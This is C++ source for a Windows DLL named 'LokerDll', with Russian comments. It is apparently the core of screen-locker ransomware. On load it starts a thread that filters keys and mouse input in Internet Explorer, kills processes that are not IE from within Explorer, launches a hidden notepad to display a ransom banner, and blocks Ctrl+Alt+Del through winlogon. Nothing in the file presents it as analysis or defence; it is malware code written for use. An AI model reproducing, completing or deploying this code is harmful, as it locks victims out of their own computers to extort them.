#include <windows.h>
#include <time.h>
#include <stdio.h>
#include <process.h>
#include <hash_map>
#include <list>
#include <shlwapi.h>
#include <assert.h>

#include "Inject.h"
#include "Threading.h"
#include "dprint.h"
#include "msgfilter.h"
#include "iemsghooker.h"
#include "banner.h"
#include "noniekiller.h"
#include "procenum.h"
#include "winlgnblock.h"
#include "getsec.h"


#ifdef _M_AMD64
#error ERROR: code is not ready for X64
#endif

void* GetUrlsSection(DWORD* section_length)
{
  *section_length = 0;

  DWORD  url_section_size = 0;
  void * url_section = GetSectionData("URLs", &url_section_size);

  PP_DPRINTF(L"GetUrlsSection: section load result p=0x%p size=%d",
    url_section, url_section_size);

  PP_RETURNIF2(url_section_size == 0, NULL);
  
  *section_length = url_section_size;
  return url_section;
}


bool ProcessFilter_IE(const PROCESSENTRY32* ppe)
{
  return (StrStrI(ppe->szExeFile, L"iexplore") != NULL);
}

bool ProcessFilter_NonIE(const PROCESSENTRY32* ppe)
{
  return (!ProcessFilter_IE(ppe) );
}

bool ProcessFilter_Explorer(const PROCESSENTRY32* ppe)
{
  return (StrStrI(ppe->szExeFile, L"explorer") != NULL);
}

bool ProcessFilter_Notepad(const PROCESSENTRY32* ppe)
{
  return (StrStrI(ppe->szExeFile, L"notepad") != NULL);
}

bool ProcessFilter_Winlogon(const PROCESSENTRY32* ppe)
{
  return (StrStrI(ppe->szExeFile, L"winlogon") != NULL);
}

static bool IsCurrentProcessNotExplorer()
{
  return !IsCurrentProcessCorrespondToFilter(
    ProcessFilter_Explorer);
}

void TryInitNotepadStart()
{
  PP_DPRINTF(L"TryInitNotepadStart: started.");

  PP_RETURNIF1(IsCurrentProcessNotExplorer());

  CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);

  while (true)
  {
    DWORD result = (DWORD)::ShellExecute(NULL, L"open", L"notepad.exe", L"", NULL, SW_HIDE);
    bool  notepad_run_ok = (result > 32);

    PP_DPRINTF(L"TryInitNotepadStart: ::ShellExecute('notepad.exe') return %d.",
      result);

    PP_RETURNIF1(notepad_run_ok);

    Sleep(100);
  }  
}

unsigned __stdcall DllMainStartThread(void* p)
{
  PP_DPRINTF(L"LokerDll:DllMainStartThread: started.");

  // Пробуем запустить IE часть
  //  - фильтрация клавищ Alt Ctrl и правой кнопки мыши
  TryInitIEFiltering();
  
  // Пробуем запустить Explorer часть:
  // - убивание всего, что не IE
  // - запуск notepad для показа банера
  TryInitNonIEKilling();
  TryInitNotepadStart();

  // Пробуем запустить Notepad часть:
  // - просмотр банера
  TryInitBannerShowing();

  // Пробуем запустить Winlogon часть:
  // - блокировка CtrlAltDel
  TryInitWinlogonFiltering();

  _endthreadex(0);
  return 0; 
}


/// При загрузке библиотеки извлекается из ресурсов список урлов
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)
{
  WCHAR path[MAX_PATH];

  ZeroMemory(path, sizeof(path));
  GetModuleFileName(NULL, path, ARRAYSIZE(path) - 1);

  PP_DPRINTF(L"LokerDll:DllMain: hinst=0x%X reason=0x%X reserved=0x%p self_exe_path='%s'",
    hinstDLL, fdwReason, lpvReserved, path);

  switch (fdwReason)
  {
  case DLL_PROCESS_DETACH: break;

  case DLL_PROCESS_ATTACH:
    {
      unsigned threadID;
      HANDLE th1 = (HANDLE)_beginthreadex(NULL, 0, &DllMainStartThread, NULL, 0, &threadID);      
      if (th1) CloseHandle(th1);
    }
    break;
  }
  return TRUE;
}


